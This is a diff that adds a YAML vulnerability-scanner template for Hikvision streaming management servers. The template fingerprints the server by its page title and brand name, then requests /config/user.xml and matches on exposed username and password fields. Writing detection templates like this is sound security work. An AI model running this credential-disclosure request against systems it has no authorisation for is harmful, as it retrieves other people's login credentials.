@@ -1,0 +1,39 @@
+id: hikvision-info-leak
+info:
+  name: Hikvision Information Leak Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: info-leak
+  description: |
+    This template detects information leakage in Hikvision streaming management servers.
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<TITLE>流媒体管理服务器</TITLE>"
+          - "海康威视"
+        part: body
+
+  - raw:
+      - |
+        GET /config/user.xml HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<user name=\""
+          - " password=\""
+        part: body
